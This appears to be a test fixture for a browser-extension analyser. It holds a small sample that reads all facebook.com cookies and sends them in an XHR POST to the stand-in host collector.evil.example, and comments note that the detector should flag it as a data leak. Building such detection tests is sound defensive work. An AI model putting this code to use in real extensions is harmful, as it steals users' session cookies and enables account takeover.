// XHR body exfiltration: the cookie is sent as the POST body via
// XMLHttpRequest.send(body) → XML_HTTP_REQUEST_SEND. A body leak is real
// exfiltration → DATA_LEAK, in contrast to the setRequestHeader (auth) variant
// which is suppressed.
chrome.cookies.getAll({ domain: "facebook.com" }, (cookies) => {
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://collector.evil.example/c");
  xhr.setRequestHeader("content-type", "application/json");
  xhr.send(JSON.stringify(cookies));
});
